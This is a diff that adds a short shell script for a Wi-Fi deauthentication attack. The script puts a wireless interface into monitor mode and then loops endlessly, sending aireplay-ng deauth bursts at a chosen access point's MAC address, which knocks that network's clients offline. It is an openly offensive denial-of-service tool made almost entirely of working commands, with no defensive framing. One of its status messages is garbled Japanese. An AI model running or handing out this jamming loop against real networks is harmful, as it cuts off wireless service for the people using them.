@@ -1,0 +1,48 @@
+#!/bin/sh
+
+if [ $# -eq 2 ]
+then
+	echo -e "[i] Conntecting to $1\n[i] Bssid : $2"
+else
+	echo "[Info] Usage: $0 wireless-interface mac-of-ap"
+	exit 1
+fi
+iface=$1
+AP=$2
+newiface="mucahit0"
+
+ifconfig $newiface 2>/dev/null
+
+if [ $? -eq 0 ]
+then
+	echo "私は”$newiface”を見るました"
+else
+	iw $iface interface add $newiface type monitor 2>/dev/null
+	if [ $? -eq 0 ]
+	then
+		rfkill unblock all
+		ifconfig $newiface up
+		echo "interface created: $newiface"
+	else
+		echo "You Don't Have permissions. Exiting..."
+		exit 1
+	fi
+fi
+
+function ctrlc() {
+	iw $newiface del
+	clear
+	exit
+}
+echo "Ctrl-C is Setting."
+trap ctrlc SIGINT
+trap ctrlc SIGTERM
+
+echo "Atack Starting"
+while true
+do
+	aireplay-ng --deauth 1000 -a $AP $newiface --ignore-negative-one
+	sleep 7
+done
+
+	
